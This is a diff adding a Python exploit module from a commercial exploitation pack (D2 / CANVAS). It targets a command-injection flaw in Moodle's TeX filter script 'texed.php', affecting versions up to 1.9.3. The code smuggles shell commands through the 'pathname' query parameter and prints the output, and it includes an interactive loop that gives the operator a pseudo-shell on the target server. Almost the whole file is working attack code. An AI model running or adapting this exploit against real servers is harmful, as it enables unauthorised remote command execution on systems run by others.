@@ -1,0 +1,105 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os
+
+sys.path.append(".")
+sys.path.append(os.path.join(os.getcwd(), '3rdparty/D2SEC/libs'))
+
+from exploitutils import *
+import canvasengine
+from canvasexploit import canvasexploit
+import httplib, mimetypes
+
+# GUI info
+NAME = "d2sec_moodle_rexec"
+DESCRIPTION = "Moodle 'texed.php' Remote Command Execution Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['Vendor'] = 'Moodle'
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = '2008-12-12'
+DOCUMENTATION['References'] = 'http://www.securityfocus.com/bid/32801'
+DOCUMENTATION['Versions Affected'] = 'version <= 1.9.3'
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+
+DOCUMENTATION["Notes"] = """
+
+- The Tex filter is not enable by default in Moodle
+- Use arg shell:1 in commandline to "simulate" a comand shell. 
+
+"""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 80
+    self.webroot = '/moodle'
+    self.cmd = ''
+    self.webhost = ''
+    self.shell = 0
+
+  def remote_exec_cmd(self):
+    self.cmd = self.cmd.replace(' ', '+')
+    url = 'filter/tex/texed.php?formdata=foo&pathname=foo";%s+"' % self.cmd
+    conn = httplib.HTTPConnection('%s:%d' % (self.host, self.port))
+    conn.request('GET', '%s/%s' % (self.webroot, url))
+    resp = conn.getresponse()
+    if resp.status ==  404: self.log('[D2] Tex filter is enabled ?')
+    if resp.status == 200: self.log('[D2] %s' % resp.read())
+    conn.close()
+
+  def remote_shell(self):
+    while 1:
+      strs = raw_input('moodle $> ')
+      if strs == 'quit':
+        break
+      self.cmd = 'echo `%s`;exit;' % strs
+      self.remote_exec_cmd()
+
+  def run(self):
+    self.host = self.target.interface	
+    self.webhost = self.argsDict.get('hostname', self.webhost)
+    if not self.webhost:
+      self.webhost = self.host
+    self.port = int(self.argsDict.get('port', self.port))
+    self.webroot = self.argsDict.get('webroot', self.webroot)
+    self.cmd = self.argsDict.get('cmd', self.cmd)
+    self.cmd = 'echo `%s`;exit;' % self.cmd
+    self.shell = int(self.argsDict.get('shell', self.shell))
+
+    ret = self.test()
+    self.setInfo('[D2] %s attacking %s - running'%(NAME,self.host))
+    if self.shell:
+      self.remote_shell()
+    else:      
+      self.remote_exec_cmd()
+    self.setInfo('[D2] %s attacking %s - done' % (NAME,self.host))
+    return 1
+
+  def usage(self):
+  	print 'Usage: %s -t host [-p port:80] -O webhost:<url> -O cmd:<command> -O shell:<0|1>' % sys.argv[0]
+  	return
+
+if __name__ == '__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
